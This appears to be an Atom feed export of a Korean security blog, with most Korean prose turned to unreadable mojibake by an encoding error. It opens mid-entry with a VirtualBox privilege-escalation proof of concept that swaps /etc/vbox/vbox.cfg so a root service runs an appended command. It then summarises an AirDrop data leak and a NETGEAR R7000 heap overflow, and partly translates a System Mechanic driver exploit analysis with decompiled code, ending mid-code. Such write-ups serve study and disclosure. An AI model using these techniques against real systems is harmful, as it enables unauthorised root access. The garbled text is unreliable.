ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><blockquote><p>sticky bitê°€ ì„¤ì •ëœ ë””ë ‰í„°ë¦¬ì—ëŠ” ëˆ„êµ¬ë‚˜ íŒŒì¼ì„ ìƒì„±í•  ìˆ˜ ìˆì§€ë§Œ ì‚­ì œ ë° ìˆ˜ì •ì€ ìƒì„±í•œ ìœ ì €ì™€ rootë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p></blockquote><p>ìœ„ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´  <code>vboxautostart.sh</code>, <code>vboxdrv.sh</code>ë° <code>vboxweb-service.sh</code>ì™€ ê°™ì´ root ê¶Œí•œì˜ VirtualBox bash scriptì—ì„œ ì‚¬ìš©ë˜ëŠ” <code>/etc/vbox/vbox.cfg</code> íŒŒì¼ì„ ìˆ˜ì •í•  ìˆ˜ ìˆì–´ root ê¶Œí•œìœ¼ë¡œ í˜„ì¬ ì‘ì—… ë””ë ‰í„°ë¦¬(CWD) ë‚´ì˜ ì œí•œëœ ëª…ë ¹ ë° íŒŒì¼ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. PoCëŠ” ì„¤ëª…ê³¼ í•¨ê»˜ ì•„ë˜ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-comment">//vboxusers ê·¸ë£¹ nobody ìƒì„±</span>root<span class="hljs-meta"># su -g vboxusers nobody</span>nobody$ cd /etc/vboxnobody$ cp vbox.cfg vbox.cfg.<span class="hljs-keyword">new</span><span class="hljs-comment">// nobodyì—ì„œ ê¸°ì¡´ vbox.cfg ì‚­ì œí›„ ì„ì˜ ëª…ë ¹ì´ í¬í•¨ëœ vbox.cfgë¡œ ëŒ€ì²´</span>nobody$ rm -f vbox.cfgnobody$ mv vbox.cfg.<span class="hljs-keyword">new</span> vbox.cfgnobody$ echo <span class="hljs-string">&quot;touch /root/evil&quot;</span> &gt;&gt;vbox.cfgnobody$ <span class="hljs-built_in">exit</span><span class="hljs-comment">// vboxautostart ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ë©´ íŠ¸ë¦¬ê±°</span>root<span class="hljs-meta"># systemctl start vboxautostart.service</span>root<span class="hljs-meta"># ls -lh /root/evil</span>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">0</span>  <span class="hljs-number">2.</span> MÃ¤r <span class="hljs-number">12</span>:<span class="hljs-number">14</span> /root/evil</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>oracle</tag>
      
      <tag>virtualbox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ì• í”Œ AirDrop ì‚¬ìš©ì ê°œì¸ ì •ë³´ ìœ ì¶œ ì·¨ì•½ì </title>
    <link href="/2021/04/29/idioth/2021-04-29/"/>
    <url>/2021/04/29/idioth/2021-04-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://therecord.media/airdrop-bugs-expose-apple-users-email-addresses-phone-numbers/">AirDrop bugs expose Apple usersâ€™ email addresses, phone numbers</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>AirDrop ê¸°ëŠ¥ì´ ì¼œì ¸ ìˆëŠ” ì• í”Œ ê¸°ê¸°</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì• í”Œì˜ íŒŒì¼ ì „ì†¡ ê¸°ëŠ¥ì¸ AirDropì—ì„œ í•´ì»¤ê°€ ì‚¬ìš©ìì˜ í•¸ë“œí° ë²ˆí˜¸, ì´ë©”ì¼ ì£¼ì†Œ ë“±ì˜ ê°œì¸ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆëŠ” ë‘ ê°€ì§€ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì´ ë‘ ê°€ì§€ ë²„ê·¸ëŠ” ì„œë¡œë¥¼ ê²€ìƒ‰í•˜ê³  ì•Œê³  ìˆëŠ” ì‚¬ìš©ìì¸ì§€ í™•ì¸í•˜ëŠ” AirDrop ì—°ê²° ì´ˆë°˜ ì¸ì¦ í”„ë¡œì„¸ìŠ¤ì— ì¡´ì¬í•©ë‹ˆë‹¤. ì• í”Œ ê¸°ê¸°ëŠ” ê¸°ê¸° ìŠ¤í™ê³¼ í•¸ë“œí° ë²ˆí˜¸, Apple ID, ì´ë©”ì¼ ì£¼ì†Œ ë“±ì„ í¬í•¨í•œ ê°œì¸ ë°ì´í„°ì™€ ê°™ì€ ê¸°ê¸°ì™€ ì†Œìœ ìì— ê´€í•œ ì •ë³´ë¥¼ í¬í•¨í•œ AWDL(Apple Wireless Direct Link) íŒ¨í‚·ì„ êµí™˜í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë°ì´í„°ë“¤ì´ intercept ë˜ëŠ” ê²ƒì„ ë§‰ê¸° ìœ„í•´ Appleì€ SHA256 í•´ì‰¬ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ë³´í˜¸í•©ë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ AirDropì´ ì¼œì ¸ìˆëŠ” ìƒíƒœì—ì„œ ê¸°ê¸°ëŠ” discovery packetì„ ëª¨ë“  ë°©í–¥ìœ¼ë¡œ í•­ìƒ ë¸Œë¡œë“œ ìºìŠ¤íŠ¸ í•©ë‹ˆë‹¤. í•´ì»¤ì™€ ë¬¼ë¦¬ì ìœ¼ë¡œ ê°€ê¹Œìš´(ë¸”ë£¨íˆ¬ìŠ¤ ê±°ë¦¬) ì‚¬ìš©ìëŠ” WiFi ì¹´ë“œë¥¼ í†µí•´ ë©”ì‹œì§€ë“¤ì„ intercept í•˜ì—¬ í•´ì‰¬ëœ ë°ì´í„°ì˜ ì¼ë¶€ë¥¼ ë³µêµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì• í”Œì€ 2019ë…„ 5ì›”ë¶€í„° <a href="https://www.zdnet.com/article/apples-awdl-protocol-plagued-by-flaws-that-enable-tracking-and-mitm-attacks/">ì´ëŸ¬í•œ ì´ìŠˆ</a>ì— ëŒ€í•´ì„œ ì•Œê³  ìˆì—ˆìœ¼ë©° ì·¨ì•½ì ì„ ì°¾ì€ Research íŒ€ì—ì„œ ìƒˆë¡œìš´ PrivateDrop protocol ì‚¬ìš©ì„ ì œì•ˆí•˜ì˜€ìœ¼ë‚˜ ì•„ì§ ì• í”Œì—ê²Œ ë‹µë³€ì„ ë°›ì§€ ëª»í–ˆë‹¤ê³  í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>apple</tag>
      
      <tag>airdrop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-31802: NETGEAR Nightawk R7000 RCE</title>
    <link href="/2021/04/28/fabu1ous/2021-04-28/"/>
    <url>/2021/04/28/fabu1ous/2021-04-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/">NETGEAR Nightawk R7000 PreAuth RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Netgear Nighthawk R7000 firmware &lt;= 1.0.11.116</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NETGEAR R7000 ë¼ìš°í„°ì—ì„œ ì¸ì¦ ì ˆì°¨ë¥¼ ë¬´ì‹œí•˜ê³  ì›ê²© ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ HTTP ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì—ì„œ user supplied dataì— ëŒ€í•œ ê²€ì¦ ë¯¸í¡ìœ¼ë¡œ ë°œìƒí•˜ê³  ì´ë¥¼ ì•…ìš©í•´ í•´ì»¤ëŠ” ë£¨íŠ¸ ê¶Œí•œì˜ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìœ ì €ëŠ” Httpdì˜  <code>/backup.cgi</code> URLì„ í†µí•´  íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‘ ê°œì˜ ë³€ìˆ˜ë¡œ í•´ë‹¹ íŒŒì¼ì˜ í¬ê¸°ë¥¼ í‘œí˜„í•˜ëŠ”ë°  ê·¸ì¤‘ í•˜ë‚˜ëŠ” HTTP POST Request Headerì˜ <code>Content-length</code> ê°’ì„, ë‹¤ë¥¸ í•˜ë‚˜ëŠ” HTTP POST Request Bodyì˜ <code>Content-length</code> ê°’ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>í”„ë¡œê·¸ë¨ì€ <code>malloc</code>ì„ í˜¸ì¶œí•´ íŒŒì¼ì˜ ë°ì´í„°ë¥¼ ì €ì¥í•˜ê¸° ìœ„í•œ  <code>Content-length+600</code> í¬ê¸°ì˜ ì²­í¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. HTTP POST Request Headerì˜ <code>Content-length</code>ëŠ” ìœ ì €ê°€ ì œì–´í•  ìˆ˜ ìˆëŠ” ë°ì´í„°ì´ë¯€ë¡œ ì„ì˜ í¬ê¸°ì˜ chunkë¥¼ í• ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ í›„  <code>memcpy</code>ë¥¼ ì‚¬ìš©í•´ í• ë‹¹ëœ ì²­í¬ì— íŒŒì¼ ë°ì´í„°ë¥¼ ì˜®ê¸°ëŠ”ë° HTTP POST Request Bodyì˜ <code>Content-length</code> í¬ê¸°ë§Œí¼ ë°ì´í„°ë¥¼ ë³µì‚¬í•©ë‹ˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ HTTP POST Request Bodyì˜ <code>Content-length</code>ëŠ” ìœ ì € ì œì–´ê°€ ê°€ëŠ¥í•œ ë°ì´í„°ë¡œ heap overflowë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>heap overflow</tag>
      
      <tag>firmware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploiting System Mechanic Driver Part 2</title>
    <link href="/2021/04/28/l0ch/exploiting-driver-part2/"/>
    <url>/2021/04/28/l0ch/exploiting-driver-part2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Part 1 ë³´ëŸ¬ê°€ê¸° : <a href="https://hackyboiz.github.io/2021/04/21/l0ch/exploiting-driver/">Exploiting System Mechanic Driver Part 1</a></p></blockquote><blockquote><p>ì›ë¬¸ ê¸€ : <a href="https://labs.yarix.com/2021/04/exploiting-system-mechanic-driver/">Exploiting System Mechanic Driver</a></p></blockquote><h1 id="Root-Cause-Analysis"><a href="#Root-Cause-Analysis" class="headerlink" title="Root Cause Analysis"></a>Root Cause Analysis</h1><h2 id="Analyzing-SUB-2C580-Dispatch-Routine"><a href="#Analyzing-SUB-2C580-Dispatch-Routine" class="headerlink" title="Analyzing SUB_2C580 (Dispatch Routine)"></a>Analyzing SUB_2C580 (Dispatch Routine)</h2><p><code>DeviceIoControl</code> APIê°€ ì¥ì¹˜ì—ì„œ í˜¸ì¶œë  ë•Œì˜ ë””ìŠ¤íŒ¨ì¹˜ ë£¨í‹´ì€ <code>SUB_2C580</code> í•¨ìˆ˜ì´ë‹¤. IDA Proì˜ ë””ì»´íŒŒì¼ëŸ¬ë¥¼ ì‚¬ìš©í•˜ë©´ ì´ í•¨ìˆ˜ê°€ 2ê°œì˜ ì¸ìˆ˜ë¥¼ ë°›ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. </p><ol><li><code>DeviceObject</code>ì— ëŒ€í•œ í¬ì¸í„° - <code>a1</code></li><li>ì¥ì¹˜ì— ì „ë‹¬ ëœ IRP êµ¬ì¡°ì²´ì— ëŒ€í•œ í¬ì¸í„° - <code>a2</code></li></ol><p>í•¨ìˆ˜ëŠ” <code>DeviceIoControl</code>ì´ ë³´ë‚¸ IRP í¬ì¸í„°ì—ì„œ ë©”ëª¨ë¦¬ ë²„í¼ë¥¼ í¬í•¨í•˜ëŠ” êµ¬ì¡°ì²´ì¸  <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">_IO_STACK_LOCATION</a>ë¥¼ ì¶”ì¶œí•˜ê³  ì§€ì—­ ë³€ìˆ˜ v5ì— ì €ì¥í•œë‹¤.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled.png" alt="exploiting-driver-part2/Untitled.png"></p><p>ë²„í¼ì— í¬í•¨ëœ IOCTL(<code>Parameters.Read.ByteOffset.LowPart</code> ë©¤ë²„)ê³¼ ë“œë¼ì´ë²„ ì½”ë“œì˜ í•˜ë“œ ì½”ë”©ëœ ê°’(<code>2252803</code> decimal, <code>0x226003</code> hex)ì„ ë¹„êµí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%201.png" alt="exploiting-driver-part2/Untitled%201.png"></p><p>ë¹„êµ í›„ ê°™ìœ¼ë©´ IOCTL ì½”ë“œ <code>0x226003</code>ì™€ ê´€ë ¨ëœ í•¨ìˆ˜ì¸ <code>SUB_166D0</code> ë¥¼ í˜¸ì¶œí•œë‹¤. <code>SUB_166D0</code>í•¨ìˆ˜ë¥¼ ë¶„ì„í•˜ê¸° ì „ í•¨ìˆ˜ì— ì „ë‹¬ë˜ëŠ” ì„¸ ê°€ì§€ ì¸ìˆ˜ <code>v3</code>, <code>v7</code> ë° <code>v4</code>ì— ëŒ€í•´ ì„¤ëª…í•´ì•¼ í•œë‹¤.</p><ul><li><code>v3</code> : <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iois32bitprocess">IoIs32BitProcess</a> í•¨ìˆ˜ì˜ ë°˜í™˜ ê°’ì´ë©° í˜¸ì¶œ í”„ë¡œì„¸ìŠ¤ê°€ 32ë¹„íŠ¸(TRUE)ì¸ì§€ 64ë¹„íŠ¸(FALSE)ì¸ì§€ ì•Œë ¤ì¤€ë‹¤.</li><li><code>v7</code> : ì‹¤ì œ ìœ ì € ë²„í¼ì— ëŒ€í•œ í¬ì¸í„°ì´ë©°, ì´ ê²½ìš° user-spaceì˜ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¨ë‹¤. ì´ ì£¼ì†ŒëŠ” <code>DeviceIoControl</code> APIì— ì¸ìˆ˜ë¡œ ì „ë‹¬ëœ ì£¼ì†Œì´ë‹¤.</li><li><code>v4</code> : ë²„í¼ì˜ í¬ê¸°</li></ul><h2 id="Analyzing-SUB-166D0"><a href="#Analyzing-SUB-166D0" class="headerlink" title="Analyzing SUB_166D0"></a>Analyzing SUB_166D0</h2><p>ì´ í•¨ìˆ˜ëŠ” ì´ì „ í•¨ìˆ˜ë“¤ë³´ë‹¤ ë³µì¡í•˜ê¸° ë•Œë¬¸ì— ë‹¤ì–‘í•œ ë°˜í™˜ ê°’ì„ ë¶„ì„í•´ ì½”ë“œ íë¦„ê³¼ ì œì•½ ì¡°ê±´ì„ ì´í•´í•˜ëŠ” ê²ƒìœ¼ë¡œ ì‹œì‘í–ˆë‹¤. ê°ê° ìƒíƒœ ì½”ë“œê°€ ìˆëŠ” 5ê°œì˜ return ë¬¸ì´ ìˆë‹¤. ì´ë¥¼ 16ì§„ìˆ˜ë¡œ ë³€í™˜í•˜ê³  ë‚˜ì—´í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><ol><li><code>return 0xC0000023 == STATUS_BUFFER_TOO_SMALL</code></li><li><code>return 0xC0000023 == STATUS_BUFFER_TOO_SMALL</code></li><li><code>return 0xC0000001 == STATUS_UNSUCCESSFUL</code></li><li><code>return 0xC000000D == STATUS_INVALID_PARAMETER</code></li><li><code>return 0x0 == STATUS_SUCCESS</code></li></ol><p>ê°ê° MSDNì—ì„œ ì°¾ì•„ë³´ê³  ê·¸ ì˜ë¯¸ë¥¼ ê¸°ë¡í•´ ê° ìƒíƒœ ì½”ë“œê°€ ë¬´ì—‡ì„ ì˜ë¯¸í•˜ëŠ”ì§€ ì•Œì•˜ìœ¼ë¯€ë¡œ ê° ì½”ë“œ ë¸”ë¡ì´ ë¬´ì—‡ì„ í•˜ëŠ”ì§€ ì¶”ì¸¡í•  ìˆ˜ ìˆë‹¤. </p><p>ì²« ë²ˆì§¸ <code>STATUS_BUFFER_TOO_SMALL</code> : ì•ì„œ ë§í–ˆë“¯ì´ <code>a1</code>ì€ í˜¸ì¶œìê°€ í•¨ìˆ˜ì— ì „ë‹¬í•œ ì²« ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ì´ë©° <code>IoIs32BitProcess</code>ì˜ ë°˜í™˜ ê°’ì´ê³  <code>a3</code>ì€ ë²„í¼ í¬ê¸°ì´ë‹¤. ë”°ë¼ì„œ í˜¸ì¶œ í”„ë¡œì„¸ìŠ¤ê°€ 32ë¹„íŠ¸ì¸ ê²½ìš° ë²„í¼ í¬ê¸°ëŠ” <code>0xC</code> ì´ìƒì´ì–´ì•¼ í•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%202.png" alt="exploiting-driver-part2/Untitled%202.png"></p><p>64ë¹„íŠ¸ í”„ë¡œì„¸ìŠ¤ì¸ ê²½ìš° <code>0x18</code> ì´ìƒì´ì–´ì•¼ í•œë‹¤. ë‘ ê²½ìš° ëª¨ë‘ ë²„í¼ í¬ê¸° ê²€ì‚¬ë¥¼ í†µê³¼í•˜ë©´ <code>LABEL_6</code>ìœ¼ë¡œ ì´ë™í•œë‹¤. 64ë¹„íŠ¸ì˜ ê²½ìš° ì…ë ¥ êµ¬ì¡°ì²´ë¥¼ 8bytes ê¸¸ì´ì˜ 3ê°œë¡œ ë‚˜ëˆ„ì–´ ë” ë§ì€ ë¡œì»¬ ë³€ìˆ˜ê°€ ìƒì„±ëœë‹¤.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%203.png" alt="exploiting-driver-part2/Untitled%203.png"></p><pre><code class="hljs cpp">v8 = *(_QWORD *)a2;v9 = *((_QWORD *)a2 + <span class="hljs-number">1</span>);v10 = *((_QWORD *)a2 + <span class="hljs-number">2</span>);</code></pre><p>ìœ„ì—ì„œ ë””ì»´íŒŒì¼ëœ ì½”ë“œë¥¼ ì‚´í´ë³´ë©´ ì…ë ¥ ë²„í¼ê°€ 3ê°œì˜ ì„œë¡œ ë‹¤ë¥¸ 8bytes í•„ë“œë¡œ êµ¬ì„±ëœ ì¼ì¢…ì˜ 24bytes ê¸¸ì´ êµ¬ì¡°ì²´ì¼ ê²ƒìœ¼ë¡œ ì¶”ì¸¡í–ˆë‹¤. <code>v8</code>, <code>v9</code> ë° <code>v10</code>ì´ ì¦ê°€ ì˜¤í”„ì…‹ì„ ì‚¬ìš©í•´ ì…ë ¥ ë²„í¼ ì£¼ì†Œì— ì•¡ì„¸ìŠ¤í•˜ê³  í•´ë‹¹ í¬ì¸í„°ë¥¼ ì—­ì°¸ì¡°í•´ ìƒëŒ€ ê°’ì„ ê²€ìƒ‰í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%204.png" alt="exploiting-driver-part2/Untitled%204.png"></p><p>ì°¸ê³  : ì´ëŠ” ì•½ê°„ì˜ í¬ì¸í„° ì—°ì‚°ìœ¼ë¡œ ìˆ˜í–‰ë˜ì–´ ë‹¤ìŒê³¼ ê°™ì´ 25, 26, 27 í–‰ì„ í•´ì„í•  ìˆ˜ ìˆë‹¤.</p><ul><li>25í–‰ : <code>a2</code>ë¥¼ 64ë¹„íŠ¸ ê°’ <code>(_QWORD *)</code>ì— ëŒ€í•œ í¬ì¸í„°ë¡œ ì·¨ê¸‰í•˜ê³  í•´ë‹¹ í¬ì¸í„°ë¥¼ ì—­ì°¸ì¡°í•œë‹¤.</li><li>26í–‰ : ìœ„ì™€ ë™ì¼í•˜ì§€ë§Œ <code>a2</code>ë¥¼ 64ë¹„íŠ¸ ê°’ í¬ì¸í„°ë¡œ ìºìŠ¤íŒ…í•œ í›„ <code>+1</code>ì´ ì¶”ê°€ëœë‹¤. ì´ëŠ” QWORDì´ë¯€ë¡œ ë‹¤ìŒ 8bytes ê°’ì„ ì˜ë¯¸í•œë‹¤.</li><li>27í–‰ : ìœ„ì˜ í–‰ê³¼ ë™ì¼í•˜ì§€ë§Œ <code>+2</code>ë¡œ ì„¸ ë²ˆì§¸ QWORDë¡œ ê±´ë„ˆë›°ë¯€ë¡œ <code>a2</code> ë‹¤ìŒ 16bytes ê°’ì„ ì˜ë¯¸í•œë‹¤.</li></ul><p>ë‹¤ìŒ ì½”ë“œëŠ” <code>LABEL_6</code>ìœ¼ë¡œ ì‹œì‘í•œë‹¤.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%205.png" alt="exploiting-driver-part2/Untitled%205.png"></p><p><code>qword_38B28</code>ì€ ëŸ°íƒ€ì„ì— 32ë¹„íŠ¸ ê°’ <code>0x00000009</code>ì˜ ì£¼ì†Œì´ë‹¤. WinDbgë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ í•¨ìˆ˜ì— breakpointë¥¼ ì„¤ì •í•˜ê³  ì´ì „ì— ì°¾ì€ IOCTL ì½”ë“œë¡œ <code>DeviceIoControl</code> APIë¥¼ í˜¸ì¶œí•˜ì—¬ í™•ì¸í–ˆë‹¤. ì„ì˜ì˜ IOCTL ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆë„ë¡ ì˜¤í”ˆì†ŒìŠ¤ ì†Œí”„íŠ¸ì›¨ì–´ì¸ <a href="https://github.com/VoidSec/ioctlpus">IOCTLpus</a>ë¥¼ í™œìš©í–ˆë‹¤. IOCTLpusëŠ” Jackson Thuraisamyì—ì„œ ë§Œë“¤ì—ˆì§€ë§Œ í˜„ì¬ VoidSecì—ì„œ í¬í¬ ì¤‘ í•˜ë‚˜ë¥¼ ì ê·¹ì ìœ¼ë¡œ ê´€ë¦¬í•˜ê³  ìˆë‹¤. ì„ì˜ì˜ ì…ë ¥ìœ¼ë¡œ <code>DeviceIoControl</code> ìš”ì²­ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” íˆ´ì´ë‹¤.(Burp Repeaterì™€ ìœ ì‚¬í•œ ê¸°ëŠ¥ì„ í¬í•¨)</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%206.png" alt="exploiting-driver-part2/Untitled%206.png"></p><p>IOCTLpusë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ <code>DeviceIoControl</code> ìš”ì²­ì„ ìˆ˜í–‰í•˜ê³  <code>UserBuffer</code>ì˜ ê°’ì„ ë³€ê²½í•˜ë©´ì„œ ì·¨ì•½ì ì´ ë„ í¬ì¸í„° ì—­ ì°¸ì¡°ê°€ ì•„ë‹˜ì„ ë°œê²¬í–ˆë‹¤. ioctlbf í¼ì €ê°€ ëª¨ë“  ë²„í¼ì˜ ê°’ì„ 0ìœ¼ë¡œ ì„¤ì •í•´ë²„ë ¤ ì„ì˜ ì“°ê¸°ê°€ ì•„ë‹Œ ë„ í¬ì¸í„° ì—­ ì°¸ì¡°ì²˜ëŸ¼ ë³´ì¸ ê²ƒì´ë‹¤. </p><blockquote><p>Protip : WinDbgë¥¼ ë””ë²„ê¸°ì— ì—°ê²° í•œ ì§í›„ <code>lm vm amp</code> ìœ¼ë¡œ ë“œë¼ì´ë²„ì˜ base addressë¥¼ ê°€ì ¸ì˜¨ë‹¤. ê·¸ ë’¤ IDA-&gt;Edit-&gt;Segments-&gt;Rebase ë¡œ í˜„ì¬ íŒŒì¼ì˜ base addressë¥¼ ì„¤ì •í•˜ë©´ ë””ì»´íŒŒì¼ëœ ì½”ë“œì™€ WinDbgì—ì„œ ì¼ê´€ì„±ì´ ìˆë„ë¡ ë¶„ì„í•  ìˆ˜ ìˆë‹¤.</p></blockquote><p>34 í–‰ì—ì„œ <code>qword_38B28</code>ì´ ê°€ë¦¬í‚¤ëŠ” DWORD (32 ë¹„íŠ¸ ê°’)ë¥¼ <code>v4</code>ì™€ ë¹„êµí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. ì´ ë³€ìˆ˜ëŠ” <code>v8</code>ì— í¬í•¨ëœ ê°’ìœ¼ë¡œ ì´ˆê¸°í™”ë˜ë©°, ì´ëŠ” ì…ë ¥ êµ¬ì¡°ì²´ì˜ ì²« ë²ˆì§¸ í•„ë“œ ê°’ì´ë‹¤. ë”°ë¼ì„œ ì…ë ¥ ë²„í¼ì˜ ì²˜ìŒ 4bytesì— <code>qword_38B28 (0x00000009)</code>ë³´ë‹¤ í¬ê±°ë‚˜ ê°™ì€ ê°’ì´ í¬í•¨ë˜ì–´ ìˆìœ¼ë©´ ê²€ì‚¬ê°€ ì‹¤íŒ¨í•˜ê³  <code>STATUS_INVALID_PARAMETER</code>ë¥¼ ë°˜í™˜í•œë‹¤. ê²€ì‚¬ê°€ ì„±ê³µí•˜ë©´ ì…ë ¥ êµ¬ì¡°ì²´ì˜ ì²« ë²ˆì§¸ í•„ë“œ ê°’ì´ switch caseì™€ ê°™ì€ ì½”ë“œì— ëŒ€í•œ ì¸ë±ìŠ¤ë¡œ ì‚¬ìš©ëœë‹¤.</p><pre><code class="hljs cpp">v8 = *(_QWORD *)(qword_38B28 + <span class="hljs-number">16</span>i64 * v4 + <span class="hljs-number">8</span>);-&gt; v8 = *(_QWORD *)(<span class="hljs-number">9</span> + <span class="hljs-number">16</span> * field1_user_buffer + <span class="hljs-number">8</span>);</code></pre><p>switch case ì¸ë±ìŠ¤ì¸ ì´ìœ ëŠ” ë‹¤ìŒ ì„¹ì…˜ì—ì„œ v8ì˜ ì£¼ì†Œë¥¼ ë§¤ê°œë³€ìˆ˜ë¡œ ì‚¬ìš©í•˜ëŠ” <code>SUB_16C40</code> í•¨ìˆ˜ë¥¼ ë¶„ì„í•˜ë©´ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p><code>SUB_166D0</code> ì˜ ì „ì²´ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">DriverVulnerableFunction</span><span class="hljs-params">(<span class="hljs-keyword">bool</span> BoolIs32BitProcess, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *userBuffer, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bufferSize)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> field1_32; <span class="hljs-comment">// eax</span>  __int64 field2_32; <span class="hljs-comment">// r8</span>  __int64 field3_32_ptr; <span class="hljs-comment">// rbx</span>  __int64 field1_64; <span class="hljs-comment">// [rsp+20h] [rbp-28h] BYREF</span>  __int64 field2_64; <span class="hljs-comment">// [rsp+28h] [rbp-20h]</span>  __int64 field3_64_ptr; <span class="hljs-comment">// [rsp+30h] [rbp-18h]</span>  __int64 *v11; <span class="hljs-comment">// [rsp+38h] [rbp-10h]</span>  __int64 v12; <span class="hljs-comment">// [rsp+68h] [rbp+20h] BYREF</span>  <span class="hljs-keyword">if</span> ( BoolIs32BitProcess )  &#123;                                             <span class="hljs-comment">// 32 bit Process</span>    <span class="hljs-keyword">if</span> ( bufferSize &gt;= <span class="hljs-number">12</span> )    &#123;                                           <span class="hljs-comment">// Struct contaning 3 32-bits fields</span>      field1_32 = *userBuffer;                  <span class="hljs-comment">// (int)userBuffer[0];</span>      field2_32 = (<span class="hljs-keyword">int</span>)userBuffer[<span class="hljs-number">1</span>];      field3_32_ptr = (<span class="hljs-keyword">int</span>)userBuffer[<span class="hljs-number">2</span>];      <span class="hljs-keyword">goto</span> LABEL_6;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000023</span>i64;                       <span class="hljs-comment">// STATUS_BUFFER_TOO_SMALL</span>  &#125;  <span class="hljs-keyword">if</span> ( bufferSize &lt; <span class="hljs-number">24</span> )                        <span class="hljs-comment">// 64 bit Process</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000023</span>i64;                       <span class="hljs-comment">// STATUS_BUFFER_TOO_SMALL</span>  field1_64 = *(_QWORD *)userBuffer;            <span class="hljs-comment">// Struct 